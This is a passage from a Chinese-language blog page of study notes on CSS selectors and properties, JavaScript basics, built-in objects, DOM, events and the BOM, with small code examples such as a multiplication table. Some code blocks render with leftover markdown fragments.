class="hljs-number">2</span>;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意：各属性间用<code>;</code>隔开 最后一个元素可加可不加</p></blockquote><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><p>选择器：筛选具有相同特征的元素</p><h4 id="基本选择器"><a href="#基本选择器" class="headerlink" title="基本选择器"></a>基本选择器</h4><ul><li><p>id选择器：选择具体id属性值的元素</p><ul><li><p>语法：#id属性值{} </p><blockquote><p>建议id值在一个html文件中唯一</p></blockquote></li></ul></li><li><p>元素选择器:选择具有相同标签名称的元素</p><ul><li><p>标签名称{}</p><blockquote><p>id选择器优先级高于元素选择器</p></blockquote></li></ul></li><li><p>类选择器：选择具有相同class属性值的元素</p><ul><li><p>.class属性值{}</p><blockquote><p>类选择器优先级高于元素选择器</p><p>优先级 id选择器&gt;类选择器&gt;元素选择器</p></blockquote></li></ul></li></ul><blockquote><p>注意：属性值不能以数字开头，也不能纯数字</p></blockquote><h4 id="扩展选择器"><a href="#扩展选择器" class="headerlink" title="扩展选择器"></a>扩展选择器</h4><ul><li><p>选择所有元素</p><ul><li>*{}</li></ul></li><li><p>并集选择器</p><ul><li>选择器1,选择器2{}</li></ul></li><li><p>后代选择器：筛选选择器1元素下所有的选择器2（包括其孙类中的）</p><ul><li>选择器1 选择器2{}</li></ul></li><li><p>子选择器:筛选父元素是选择器1的选择器2（只看直接子类）</p><ul><li>选择器1&gt;选择器2{}</li></ul><blockquote><p>注意，如果选择器2元素内有子标签，则会连同子标签一起使用样式，后代选择器和子选择器都有这种效果</p><ul><li>可在选择器后加<code>:first-child</code> 或<code>:last-child</code>表示选择第一个子类或最后一个 </li><li>⚠️这种加冒号，冒号和左右两个字符串都不能有空格间隙</li></ul></blockquote></li><li><p>属性选择器:选择元素名称，属性名&#x3D;属性值的元素</p><ul><li>元素名称[属性名&#x3D;”属性值”]</li></ul></li><li><p>伪类选择器：选择一些元素具有的状态</p><ul><li>语法： 元素:状态{}</li><li><a>:状态<ul><li>状态<ul><li>link 初始化状态</li><li>vistied 被访问过的状态</li><li>active 正在访问状态(鼠标点住不放)</li><li>hover 鼠标悬浮状态</li></ul></li></ul></li></ul></li></ul><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4evjjzsv9j20sm0aywfm.jpg" alt="image-20220721213511321"></p><h3 id="属性-2"><a href="#属性-2" class="headerlink" title="属性"></a>属性</h3><p>一般用在div元素标签下</p><ol><li><p>字体、文本</p><ul><li>font-size 字体大小</li><li>color 文本颜色</li><li>text-align 对齐方式</li><li>line-height：行高</li></ul></li><li><p>背景</p><ul><li>background</li></ul></li><li><p>边框</p><ul><li>border 设置边框，符合属性</li></ul></li><li><p>尺寸</p><ul><li>width 宽度</li><li>height 高度</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">div</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid red;</span><br><span class="language-css">    <span class="hljs-comment">/*尺寸*/</span></span><br><span class="language-css">    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;</span><br><span class="language-css">    <span class="hljs-comment">/*背景*/</span></span><br><span class="language-css">    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;../image/2.jpg&quot;</span>) no-repeat center;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>盒子模型:控制布局</p><ul><li><p>margin 外边距</p></li><li><p>padding 内边距</p><ul><li><p>默认情况下内边距会影响盒子大小</p><blockquote><p><code>box-sizing: border-box;</code> 设置盒子属性,让width height不变</p></blockquote></li></ul></li><li><p>float 浮动</p><ul><li>left 在该行</li><li>right</li></ul></li></ul></li></ol><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="概念：一门客户端脚本语言"><a href="#概念：一门客户端脚本语言" class="headerlink" title="概念：一门客户端脚本语言"></a>概念：一门客户端脚本语言</h3><ul><li>运行在客户端浏览器中的。每一个浏览器都有JavaScript的解析引擎</li><li>脚本语言：不需要编译，直接就可以被浏览器解析执行了</li></ul><h3 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h3><ul><li>可以来增强用户和html页面的交互过程，可以来控制html元素，让页面有一些动态的效果，增强用户的体验。</li></ul><h3 id="JavaScript发展史："><a href="#JavaScript发展史：" class="headerlink" title="JavaScript发展史："></a>JavaScript发展史：</h3><ol><li>1992年，Nombase公司，开发出第一门客户端脚本语言，专门用于表单的校验。命名为 ： C–    ，后来更名为：ScriptEase</li><li>1995年，Netscape(网景)公司，开发了一门客户端脚本语言：LiveScript。后来，请来SUN公司的专家，修改LiveScript，命名为JavaScript</li><li>1996年，微软抄袭JavaScript开发出JScript语言</li><li>1997年，ECMA(欧洲计算机制造商协会)，制定出客户端脚本语言的标准：ECMAScript，就是统一了所有客户端脚本语言的编码方式。</li></ol><blockquote><p>JavaScript &#x3D; ECMAScript + JavaScript自己特有的东西(BOM+DOM)</p></blockquote><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ol><li><h4 id="与html结合方式"><a href="#与html结合方式" class="headerlink" title="与html结合方式"></a>与html结合方式</h4><ul><li>内部JS：<ul><li>定义<script>，标签体内容就是js代码</li></ul></li><li>外部JS<ul><li>定义<script>，通过src属性引入外部的js文件</li></ul></li></ul></li></ol><blockquote><pre><code class="hljs">    - `&lt;script&gt;`可以定义在html页面的任何地方。但是定义的位置会影响执行顺序。        - `&lt;script&gt;`可以定义多个。</code></pre></blockquote><ol start="2"><li><h4 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h4><ul><li><p>单行注释：<code>//注释内容</code></p></li><li><p>多行注释：<code>/*注释内容*/</code></p></li></ul></li><li><h4 id="数据类型："><a href="#数据类型：" class="headerlink" title="数据类型："></a>数据类型：</h4><ol><li><p>原始数据类型(基本数据类型)：</p><ul><li><p>number：数字。 整数/小数/NaN(not a number 一个不是数字的数字类型)</p></li><li><p>string：字符串。 字符串  "abc" "a" 'abc'</p><blockquote><p>没有字符的概念</p></blockquote></li><li><p>boolean: true和false</p></li><li><p>null：一个对象为空的占位符</p></li><li><p>undefined：未定义。如果一个变量没有给初始化值，则会被默认赋值为undefined</p></li></ul></li><li><p>引用数据类型：对象</p></li></ol></li><li><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><ul><li>变量：一小块存储数据的内存空间</li><li>Java语言是强类型语言，而JavaScript是弱类型语言。<ul><li>强类型：在开辟变量存储空间时，定义了空间将来存储的数据的数据类型。只能存储固定类型的数据</li><li>弱类型：在开辟变量存储空间时，<u>不定义空间将来的存储数据类型</u>，可以存放任意类型的数据。</li></ul></li><li>语法 <code>var 变量名 = 初始化值;</code></li><li>typeof运算符：获取变量的类型。<code>typeof(变量名)</code><br>* 注：null运算后得到的是object</li></ul></li><li><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><ul><li><p>一元运算符</p><ol><li>++，-- ， +(正号)</li></ol><ul><li>++ -- 自增 自减 （也有在前在后之分）</li></ul><ol start="2"><li><p>+(-)：正负号</p><ul><li><p>在JS中，如果运算数不是运算符所要求的类型，那么js引擎会自动的将运算数进行类型转换</p><blockquote><p>其他类型转number：</p><ul><li>string转number：按照字面值转换(纯数字字符串才能转数字)。如果字面值不是数字，则转为NaN（不是数字的数字,与别的数字运算，结果仍为NaN）</li><li>boolean转number：true转为1，false转为0</li><li>在其他类型数据前加上+或-会将后面的数据强制转换成number</li></ul></blockquote></li></ul></li></ol></li><li><p>算数运算符</p><ul><li><code>+ - * / % ...</code></li></ul></li><li><p>赋值运算符</p><ul><li>= += -+....</li></ul></li><li><p>比较运算符</p><ul><li><p>< >= <= == ===(全等于)</p><blockquote><p><strong>比较方式</strong></p><ol><li>类型相同：直接比较<ul><li>字符串：按照字典顺序比较。按位逐一比较，直到得出大小为止</li></ul></li><li>类型不同：先进行类型转换，再比较<br>* ===：全等于。在比较之前，先判断类型，如果类型不一样，则直接返回false</li></ol></blockquote></li></ul></li><li><p>逻辑运算符</p><ul><li>&& || ! （&& ||也有短路效果）</li></ul><blockquote><p>其他类型转boolean：</p><ol><li><p>number：<u>0或NaN为假</u>，其他为真</p></li><li><p>string：除了空字符串("")，其他都是true</p></li><li><p>null&undefined:都是false</p></li><li><p>对象：所有对象都为true</p></li></ol></blockquote><p>​</p></li></ul></li></ol><h4 id="6-三元运算符"><a href="#6-三元运算符" class="headerlink" title="6. 三元运算符"></a>6. 三元运算符</h4><ul><li><p>? : 表达式</p><ul><li>```js<br>var a = 3;<br>var b = 4;<br>var c = a > b ? 1:0;<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><br>    &gt; 语法：<br>    &gt;<br>    &gt; * 表达式? 值<span class="hljs-number">1</span>:值<span class="hljs-number">2</span>;<br>    &gt;<br>    &gt; * 判断表达式的值，如果是<span class="hljs-literal">true</span>则取值<span class="hljs-number">1</span>，如果是<span class="hljs-literal">false</span>则取值<span class="hljs-number">2</span><br><br><span class="hljs-meta">### 流程控制语句</span><br><br><span class="hljs-number">1.</span> <span class="hljs-keyword">if</span>...<span class="hljs-keyword">else</span>...<br><span class="hljs-number">2.</span> <span class="hljs-keyword">switch</span>:<br><br>  * 在java中，<span class="hljs-keyword">switch</span>语句可以接受的数据类型： <span class="hljs-built_in">byte</span> <span class="hljs-built_in">int</span> <span class="hljs-built_in">short</span> <span class="hljs-built_in">char</span>,枚举(<span class="hljs-number">1.5</span>) ,String(<span class="hljs-number">1.7</span>)<br><br>    ```js<br>    <span class="hljs-keyword">switch</span>(变量)&#123;<br>    <span class="hljs-keyword">case</span> 值:<br>    &#125; <span class="hljs-comment">//同一个switch内的case后的值类型可以混合</span><br></code></pre></td></tr></table></figure></li></ul><ul><li>在JS中,switch语句可以接受任意的原始数据类型</li></ul></li></ul><ol start="3"><li>while</li><li>do...while</li><li>for</li></ol><h3 id="特殊语法"><a href="#特殊语法" class="headerlink" title="特殊语法"></a>特殊语法</h3><ul><li><p>语句以;结尾，如果一行只有一条语句则 ;可以省略 (不建议)</p></li><li><p>变量的定义使用var关键字，也可以不使用</p><ul><li><p>用var： 定义的变量是局部变量</p><ul><li>不用var：定义的变量是全局变量(不建议)</li></ul></li></ul></li></ul><h3 id="练习-99乘法表"><a href="#练习-99乘法表" class="headerlink" title="练习--99乘法表"></a>练习--99乘法表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;style&gt;<br>    td&#123;<br>        <span class="hljs-attr">border</span>:1px solid ;<br>    &#125;<br>&lt;/style&gt;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;table  align=&#x27;center&#x27;&gt;&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">9</span>;i++) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;tr&gt;&quot;</span>)<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++) &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;td&gt;&quot;</span>)<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(i+<span class="hljs-string">&quot;*&quot;</span>+j+<span class="hljs-string">&quot;=&quot;</span>+i*j+<span class="hljs-string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>);<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;/td&gt;&quot;</span>)<br>    &#125;<br>    <span class="hljs-comment">// document.write(&quot;&lt;br&gt;&quot;)</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="基本对象"><a href="#基本对象" class="headerlink" title="基本对象"></a>基本对象</h3><h4 id="1-Function：函数-方法-对象"><a href="#1-Function：函数-方法-对象" class="headerlink" title="1. Function：函数(方法)对象"></a>1. Function：函数(方法)对象</h4><ul><li><p>创建</p><ul><li><p>var fun = new Function(形式参数列表,方法体); （了解即可）</p></li><li><p>```js<br>function 方法名称(形式参数列表){<br>方法体<br>}</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs wren"><br><span class="hljs-operator">-</span> ```<span class="hljs-variable">js</span><br>  <span class="hljs-keyword">var</span> 方法名 <span class="hljs-operator">=</span> <span class="hljs-title function_">function</span>(形式参数列表)&#123;<br>      方法体<br>  &#125;<br></code></pre></td></tr></table></figure></li></ul><blockquote><p>方法可以重复声明，不会报错，最新版本会覆盖旧版本，也可以用以下格式重新定义方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">方法名 = <span class="hljs-keyword">function</span>(<span class="hljs-params">形式参数列表</span>)&#123;<br> 方法体<br>&#125;<br></code></pre></td></tr></table></figure></blockquote></li><li><p>属性</p><ul><li>length:代表形参的个数</li></ul></li><li><p>特点</p><ul><li><p>方法定义是，形参的类型不用写,返回值类型也不写。</p><ol start="2"><li>方法是一个对象，如果定义名称相同的方法，会覆盖</li></ol><ul><li>在JS中，方法的调用只与方法的名称有关，和参数列表无关 （js没有方法重载）<ul><li>参数传多传少都能执行，传少的话，没接收到数据的形参为undefined，传多也不报错</li></ul></li></ul><ol start="4"><li>在方法声明中有一个隐藏的内置对象（数组），arguments,封装所有的实际参数</li></ol></li></ul></li><li><p>调用：<br>方法名称(实际参数列表);</p></li></ul><h4 id="2-Array-数组对象"><a href="#2-Array-数组对象" class="headerlink" title="2. Array:数组对象"></a>2. Array:数组对象</h4><ul><li>创建：<ul><li>var arr = new Array(元素列表);</li><li>var arr = new Array(默认长度);</li><li>var arr = [元素列表];</li></ul></li><li>方法<ul><li>join(分隔符):将数组中的元素按照指定的分隔符拼接为字符串，分隔符默认为逗号(,)</li><li>push():向数组的末尾添加一个或更多元素，<u>并返回新的长度</u>。</li></ul></li><li>特点：<ul><li>JS中，数组元素的类型可变的。</li><li>JS中，数组长度可变的。操作超出原始长度的元素时，会自动扩容</li><li>打印数组对象，默认用逗号将所有元素连接成字符串</li></ul></li></ul><h4 id="3-Boolean"><a href="#3-Boolean" class="headerlink" title="3. Boolean"></a>3. Boolean</h4><ul><li>属性<ul><li>constructor ：返回构造方法的引用</li><li>prototype：返回对象类型原型的引用</li></ul></li><li>方法<ul><li>toSource() 返回该对象源码</li><li>toString()</li><li>valueOf() 返回Boolean对象原始值</li></ul></li></ul><h4 id="4-Date：日期对象"><a href="#4-Date：日期对象" class="headerlink" title="4. Date：日期对象"></a>4. Date：日期对象</h4><ul><li>创建：<ul><li>var date = new Date();</li></ul></li><li>方法：<ul><li>toLocaleString()：返回当前date对象对应的时间本地字符串格式</li><li>getTime():获取毫秒值。返回当前如期对象描述的时间到1970年1月1日零点的毫秒值差</li></ul></li></ul><h4 id="5-Math：数学对象"><a href="#5-Math：数学对象" class="headerlink" title="5. Math：数学对象"></a>5. Math：数学对象</h4><ul><li><p>创建：<br>* 特点：Math对象不用创建，直接使用。  Math.方法名();</p></li><li><p>方法：</p><ul><li>random():返回 0 ~ 1 之间的随机数。 含0不含1</li><li>ceil(x)：对数进行上舍入。</li><li>floor(x)：对数进行下舍入。</li><li>round(x)：把数四舍五入为最接近的整数。</li></ul></li><li><p>属性：</p><ul><li>PI</li></ul></li></ul><h4 id="6-Number、String-基本数据类型包装类（与Boolean一样）"><a href="#6-Number、String-基本数据类型包装类（与Boolean一样）" class="headerlink" title="6. Number、String 基本数据类型包装类（与Boolean一样）"></a>6. Number、String 基本数据类型包装类（与Boolean一样）</h4><h4 id="7-RegExp：正则表达式对象"><a href="#7-RegExp：正则表达式对象" class="headerlink" title="7. RegExp：正则表达式对象"></a>7. RegExp：正则表达式对象</h4><ul><li><p>正则表达式：定义字符串的组成规则。</p><ul><li><p>单个字符:[]</p><ul><li><p>如： [a] [ab] [a-zA-Z0-9_]</p><pre><code class="hljs">* 特殊符号代表特殊含义的单个字符:</code></pre><ul><li>\d:单个数字字符 [0-9]</li><li>\w:单个单词字符[a-zA-Z0-9_]</li></ul></li></ul></li><li><p>量词符号：</p><ul><li>?：表示出现0次或1次</li><li>*：表示出现0次或多次</li><li>+：出现1次或多次</li><li>{m,n}:表示 m<= 数量 <= n<ul><li>m如果缺省： {,n}:最多n次</li><li>n如果缺省：{m,} 最少m次</li></ul></li></ul></li><li><p>开始结束符号</p><ul><li>^:开始</li><li>$:结束</li></ul></li></ul></li><li><p>正则对象：</p><ul><li><p>创建</p><ul><li>var reg = new RegExp("正则表达式");</li><li>var reg = /正则表达式/;</li></ul></li><li><p>方法    </p><ul><li>test(参数):验证指定的字符串是否符合正则定义的规范</li></ul></li></ul></li></ul><h4 id="8-Global"><a href="#8-Global" class="headerlink" title="8. Global"></a>8. Global</h4><ul><li><p>特点：全局对象，这个Global中封装的方法不需要对象就可以直接调用。  方法名();</p></li><li><p>方法：</p><ul><li><p>encodeURI():url编码</p></li><li><p>decodeURI():url解码</p></li><li><p>encodeURIComponent():url编码,<u>编码的字符更多</u></p></li><li><p>decodeURIComponent():url解码</p></li><li><p>parseInt():将字符串转为数字</p><ul><li>逐一判断每一个字符是否是数字，直到不是数字为止，将前边数字部分转为number</li></ul></li><li><p>isNaN():判断一个值是否是NaN</p><ul><li>NaN六亲不认，连自己都不认。NaN参与的==比较全部为false，因此判断要用isNaN函数</li></ul></li><li><p>eval(): 传入JavaScript代码字符串，并把它作为脚本代码来执行。</p></li></ul></li></ul><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="简单学习"><a href="#简单学习" class="headerlink" title="简单学习"></a>简单学习</h3><ul><li><p>功能：控制html文档的内容</p></li><li><p>获取页面标签(元素)对象：Element</p><ul><li>document.getElementById("id值"):通过元素的id获取元素对象</li></ul></li><li><p>操作Element对象：</p><ol><li><p>修改属性值：</p><ol><li>明确获取的对象是哪一个</li><li>查看API文档，找其中有哪些属性可以设置</li></ol></li><li><p>修改标签体内容：</p><ul><li>属性：innerHTML</li></ul><ol><li>获取元素对象</li><li>使用innerHTML属性修改标签体内容</li></ol></li></ol></li></ul><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="简单学习-1"><a href="#简单学习-1" class="headerlink" title="简单学习"></a>简单学习</h3><ul><li>功能： 某些组件被执行了某些操作后，触发某些代码的执行。</li></ul><ul><li><p>如何绑定事件</p><ul><li>直接在html标签上，指定事件的属性(操作)，属性值就是js代码<ul><li>事件：onclick--- 单击事件</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;light&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img/off.gif&quot;</span>  <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;js代码&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>也可以把js代码执行封装成函数，js代码处只写函数</p></blockquote><ul><li>通过js获取元素对象，指定事件属性，设置一个函数</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//1.获取light2对象</span><br><span class="hljs-keyword">var</span> light2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;light2&quot;</span>);<br><span class="hljs-comment">//2.绑定事件</span><br>light2.<span class="hljs-property">onclick</span> = fun2;<br></code></pre></td></tr></table></figure><h3 id="事件监听机制："><a href="#事件监听机制：" class="headerlink" title="事件监听机制："></a>事件监听机制：</h3><ul><li><p>概念：某些组件被执行了某些操作后，触发某些代码的执行。    </p><ul><li>事件：某些操作。如： 单击，双击，键盘按下了，鼠标移动了</li><li>事件源：组件。如： 按钮 文本输入框...</li><li>监听器：代码。</li><li>注册监听：将事件，事件源，监听器结合在一起。 当事件源上发生了某个事件，则触发执行某个监听器代码。</li></ul></li><li><p>常见的事件：</p><ol><li><p>点击事件：</p></li><li><p>onclick：单击事件</p></li><li><p>ondblclick：双击事件</p></li><li><p>焦点事件</p></li><li><p>onblur：失去焦点</p><ul><li>一般用于表单验证</li></ul></li><li><p>onfocus:元素获得焦点。</p></li><li><p>加载事件：</p></li><li><p>onload：一张页面或一幅图像完成加载。</p><ul><li>可以设置window的该事件触发函数为要使用的js代码，这样可以把js标签放在head里，不会报错找不到标签（因为标签加载完成才执行）</li></ul></li><li><p>鼠标事件：</p></li><li><p>onmousedown    鼠标按钮被按下。</p><ul><li>定义方法时，定义一个形参，接受event对象。</li><li>event对象的button属性可以获取鼠标按钮键被点击了。</li></ul></li><li><p>onmouseup    鼠标按键被松开。</p></li><li><p>onmousemove    鼠标被移动。</p></li><li><p>onmouseover    鼠标移到某元素之上。</p></li><li><p>onmouseout    鼠标从某元素移开。</p></li><li><p>键盘事件：</p><ol><li>onkeydown    某个键盘按键被按下。    </li><li>onkeyup        某个键盘按键被松开。</li><li>onkeypress    某个键盘按键被按下并松开。</li></ol></li><li><p>选择和改变</p><ol><li>onchange    域的内容被改变。</li><li>onselect    文本被选中。</li></ol></li><li><p>表单事件：</p><ol><li><p>onsubmit    确认按钮被点击。</p><ul><li>可以阻止表单的提交</li><li>方法返回false则表单被阻止提交。</li></ul><blockquote><p>封装在标签属性中时注意执行的js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//函数定义</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkForm</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-comment">//校验</span><br> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br>&lt;form action=<span class="hljs-string">&quot;#&quot;</span> id=<span class="hljs-string">&quot;form&quot;</span> onclick=<span class="hljs-string">&quot;return checkForm();&quot;</span>&gt; <span class="hljs-comment">//要return校验函数，因为底层是将onclick后js代码封装成函数，这个函数赋值给标签的onclick事件，看的是该函数返回值，如果只有一行执行校验函数，则没有返回值</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>onreset    重置按钮被点击。</p></li></ol></li></ol></li></ul><h2 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h2><h3 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h3><p>Browser Object Model 浏览器对象模型</p><ul><li>将浏览器的各个组成部分封装成对象。</li></ul><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4hd1zeqvkj213q0mg0v7.jpg" alt="image-20220724011212914"></p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li>Window：窗口对象</li></ul><ul><li>Navigator：浏览器对象</li><li>Screen：显示器屏幕对象</li><li>History：历史记录对象</li><li>Location：地址栏对象</li></ul><h3 id="Window：窗口对象"><a href="#Window：窗口对象" class="headerlink" title="Window：窗口对象"></a>Window：窗口对象</h3><ol><li><p>创建</p></li><li><p>方法</p><ol><li>与弹出框有关的方法：<ul><li>alert()    显示带有一段消息和一个确认按钮的警告框。</li><li>confirm()    显示带有一段消息以及确认按钮和取消按钮的对话框。<ul><li>如果用户点击确定按钮，则方法返回true</li><li>如果用户点击取消按钮，则方法返回false</li></ul></li><li>prompt()    显示可提示用户输入的对话框。<ul><li>返回值：获取用户输入的值</li></ul></li></ul></li><li>与打开关闭有关的方法：<ul><li>close()    关闭浏览器窗口。<ul><li>谁调用我 ，我关谁</li></ul></li><li>open()    打开一个新的浏览器窗口<ul><li>返回新的Window对象</li></ul></li></ul></li><li>与定时器有关的方式<ul><li>setTimeout()    在指定的毫秒数后调用函数或计算表达式。<ul><li>参数：<ol><li>js代码或者方法对象</li><li>毫秒值</li></ol></li><li>返回值：唯一标识，用于取消定时器</li></ul></li><li>clearTimeout()    取消由 setTimeout() 方法设置的 timeout。</li><li>setInterval()    按照指定的周期（以毫秒计）来调用函数或计算表达式。</li><li>clearInterval()    取消由 setInterval() 设置的 timeout。</li></ul></li></ol></li><li><p>属性：</p><ol><li>获取其他BOM对象：<br>history<br>location<br>Navigator<br>Screen:</li><li>获取DOM对象<br>document</li></ol></li><li><p>特点</p><ul><li>Window对象不需要创建可以直接使用 window使用。 window.方法名();</li><li>window引用可以省略。  方法名();</li></ul></li></ol><h3 id="Location：地址栏对象"><a href="#Location：地址栏对象" class="headerlink" title="Location：地址栏对象"></a>Location：地址栏对象</h3><ol><li><p>创建(获取)：</p><ol><li>window.location</li><li>location</li></ol></li><li><p>方法：</p><ul><li>reload()    重新加载当前文档。刷新</li></ul></li><li><p>属性</p><ul><li>href    设置或返回完整的 URL。</li></ul></li></ol><h3 id="History：历史记录对象"><a href="#History：历史记录对象" class="headerlink" title="History：历史记录对象"></a>History：历史记录对象</h3><p>指当前windows窗口访问的记录</p><ol><li><p>创建(获取)：</p><ol><li>window.history</li><li>history</li></ol></li><li><p>方法：</p><ul><li>back()    加载 history 列表中的前一个 URL。</li><li>forward()    加载 history 列表中的下一个 URL。</li><li>go(参数)    加载 history 列表中的某个具体页面。<ul><li>参数：<ul><li>正数：前进几个历史记录</li><li>负数：后退几个历史记录</li></ul></li></ul></li></ul></li><li><p>属性：</p><ul><li>length    返回当前窗口历史列表中的 URL 数量。</li></ul></li></ol><h1 id="DOM-1"><a href="#DOM-1" class="headerlink" title="DOM"></a>DOM</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><ul><li><p>概念： Document Object Model 文档对象模型</p><ul><li>将标记语言文档的各个组成部分，封装为对象。可以使用这些对象，对标记语言文档进行CRUD的动态操作</li></ul></li><li><p>W3C DOM 标准被分为 3 个不同的部分：</p><ul><li>核心 DOM - 针对任何结构化文档的标准模型<ul><li><p>Document：文档对象</p></li><li><p>Element：元素对象</p></li><li><p>Attribute：属性对象</p></li><li><p>Text：文本对象(不能有子节点)</p></li><li><p>Comment:注释对象</p></li><li><p>Node：节点对象，其他5个的父对象</p></li></ul></li><li>XML DOM - 针对 XML 文档的标准模型</li><li>HTML DOM - 针对 HTML 文档的标准模型</li></ul></li></ul><h2 id="核心DOM模型"><a href="#核心DOM模型" class="headerlink" title="核心DOM模型"></a>核心DOM模型</h2><h3 id="Document：文档对象"><a href="#Document：文档对象" class="headerlink" title="Document：文档对象"></a>Document：文档对象</h3><ol><li>创建(获取)：在html dom模型中可以使用window对象来获取<br>1. window.document<br> 2. document</li><li>方法：<ol><li>获取Element对象：<ol><li>getElementById()    ： 根据id属性值获取元素对象。id属性值一般唯一</li><li>getElementsByTagName()：根据标签名称获取元素对象们。返回值是一个数组</li><li>getElementsByClassName():根据Class属性值获取元素对象们。返回值是一个数组</li><li>getElementsByName(): 根据name属性值获取元素对象们。返回值是一个数组</li></ol></li><li>创建其他DOM对象：<ul><li>createAttribute(name)</li><li>createComment()</li><li>createElement()</li><li>createTextNode()</li></ul></li><li>属性</li></ol></li></ol><h3 id="Element：元素对象"><a href="#Element：元素对象" class="headerlink" 